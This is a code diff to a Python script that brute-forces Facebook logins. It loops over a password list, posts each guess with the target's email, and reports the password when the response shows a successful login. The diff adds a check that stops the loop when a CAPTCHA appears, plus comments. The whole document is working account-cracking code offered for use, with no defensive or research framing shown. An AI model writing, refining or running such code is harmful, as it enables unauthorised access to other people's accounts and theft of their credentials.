@@ -9,14 +9,21 @@ def brute_force(username, fb_id, passwords):
                                    data={'email': username, 'pass': password},
                                    timeout=10)
 
-            # Check if login was successful (you need to customize this based on Facebook's response)
+            # Check if CAPTCHA is triggered
+            if 'captcha' in result.text.lower():
+                print("CAPTCHA triggered. Aborting brute-force.")
+                break
+
+            # Check if login was successful (customize based on Facebook's response)
             if 'Welcome to Facebook' in result.text:
                 print(f"Login successful! Username: {username}, Password: {password}")
                 break
             else:
                 print(f"Login failed for Password: {password}")
+
         except requests.exceptions.RequestException as e:
             print(f"Request Error: {e}")
+            # Handle specific errors if needed
 
 # Function to read passwords from a file
 def read_passwords(file_path):
